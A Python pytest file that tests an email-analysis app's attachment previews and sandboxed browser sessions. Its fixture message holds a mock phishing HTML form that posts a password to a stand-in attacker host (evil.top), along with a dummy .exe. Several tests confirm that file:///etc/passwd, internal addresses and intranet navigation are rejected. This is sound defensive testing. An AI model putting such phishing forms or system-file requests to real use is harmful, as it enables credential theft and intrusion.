"""Previews of mail attachments: the API side (the workers are faked here;
docview/ and browser/ test themselves with LibreOffice and Chromium)."""

from __future__ import annotations

import base64
from email.message import EmailMessage

import pytest
from fastapi.testclient import TestClient

from app import previews
from app.config import settings
from tests.conftest import make_key

PDF = b"%PDF-1.7\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF"
HTML = b"<html><body><form action='https://evil.top/p'><input name=pw></form></body></html>"


def _message() -> bytes:
    m = EmailMessage()
    m["From"] = "billing@evil.top"
    m["To"] = "a@contoso.it"
    m["Subject"] = "Invoice"
    m.set_content("see attached")
    m.add_attachment(PDF, "application", "pdf", filename="invoice.pdf")
    m.add_attachment(HTML, "text", "html", filename="login.html")
    m.add_attachment(b"MZ" + b"\0" * 40, "application", "octet-stream", filename="tool.exe")
    return bytes(m)


@pytest.fixture()
def workers(monkeypatch):
    calls = []

    def call(base, header, token, method, path, body, timeout):
        calls.append((base, method, path, body))
        if path == "/render":
            return {
                "format": "pdf",
                "converted": False,
                "total": 1,
                "pages": [{"png": "iVBO", "width": 1, "height": 1}],
            }
        if path == "/sessions":
            return {"id": "a" * 32, "url": "", "network": body["network"], "screenshot": ""}
        if path.endswith("/action"):
            return {"id": "a" * 32, "url": body.get("url", ""), "owner": body["owner"]}
        return {}

    monkeypatch.setattr(previews, "_call", call)
    monkeypatch.setattr(settings, "DOCVIEW_URL", "http://docview:8720")
    monkeypatch.setattr(settings, "BROWSER_URL", "http://browser:8730")
    return calls


def _mail(admin, key):
    admin.post("/api/incidents", headers=key, json={"id": "pv", "name": "pv", "data": {}})
    r = admin.post("/api/incidents/pv/mails", headers=key, files={"file": ("m.eml", _message())})
    assert r.status_code == 201, r.text
    return r.json()["message"]["sha256"]


def test_previews_need_their_workers(admin: TestClient, monkeypatch):
    monkeypatch.setattr(settings, "DOCVIEW_URL", "")
    monkeypatch.setattr(settings, "BROWSER_URL", "")
    key = make_key(admin)
    sha = _mail(admin, key)
    assert admin.get("/api/previews/status", headers=key).json() == {"documents": False, "browser": False}
    assert admin.post(f"/api/mails/{sha}/attachments/0/preview", headers=key).status_code == 503
    assert admin.post("/api/browser/sessions", headers=key, json={"url": "https://x.top/"}).status_code == 503


def test_document_preview_is_rendered_once(admin: TestClient, workers):
    key = make_key(admin)
    sha = _mail(admin, key)
    first = admin.post(f"/api/mails/{sha}/attachments/0/preview", headers=key)
    assert first.status_code == 200 and first.json()["name"] == "invoice.pdf" and first.json()["total"] == 1
    sent = base64.b64decode(workers[0][3]["data"])
    assert sent == PDF
    assert admin.post(f"/api/mails/{sha}/attachments/0/preview", headers=key).json()["total"] == 1
    assert len([c for c in workers if c[2] == "/render"]) == 1  # the second came from the cache
    assert admin.post(f"/api/mails/{sha}/attachments/2/preview", headers=key).status_code == 422  # an .exe
    # Removing the message removes the rendered pages too.
    assert admin.delete(f"/api/incidents/pv/mails/{sha}", headers=key).status_code == 204
    again = _mail(admin, key)  # another message with the same attachment
    assert admin.post(f"/api/mails/{again}/attachments/0/preview", headers=key).status_code == 200
    assert len([c for c in workers if c[2] == "/render"]) == 2


def test_browser_sessions(admin: TestClient, workers):
    key = make_key(admin)
    sha = _mail(admin, key)
    r = admin.post("/api/browser/sessions", headers=key, json={"mail": sha, "path": "1"})
    assert r.status_code == 201 and r.json()["network"] is False
    opened = next(c for c in workers if c[2] == "/sessions")[3]
    assert base64.b64decode(opened["html"]) == HTML and opened["owner"]
    assert admin.post("/api/browser/sessions", headers=key, json={"mail": sha, "path": "0"}).status_code == 422
    assert admin.post("/api/browser/sessions", headers=key, json={"url": "http://10.0.0.5/"}).status_code == 422
    assert admin.post("/api/browser/sessions", headers=key, json={"url": "file:///etc/passwd"}).status_code == 422
    assert admin.post("/api/browser/sessions", headers=key, json={}).status_code == 422
    r = admin.post("/api/browser/sessions", headers=key, json={"url": "https://login-paypa1.top/", "network": True})
    assert r.status_code == 201

    session = "a" * 32
    r = admin.post(f"/api/browser/sessions/{session}/action", headers=key, json={"type": "click", "x": 10, "y": 20})
    assert r.status_code == 200
    bad = admin.post(
        f"/api/browser/sessions/{session}/action", headers=key, json={"type": "navigate", "url": "http://intranet/"}
    )
    assert bad.status_code == 422
    assert admin.delete(f"/api/browser/sessions/{session}", headers=key).status_code == 204

    audit = admin.get("/api/audit?q=isolated").json()
    details = [e["details"] for e in audit.get("entries", [])]
    assert any("WITH network access" in d for d in details) and any("without network" in d for d in details)
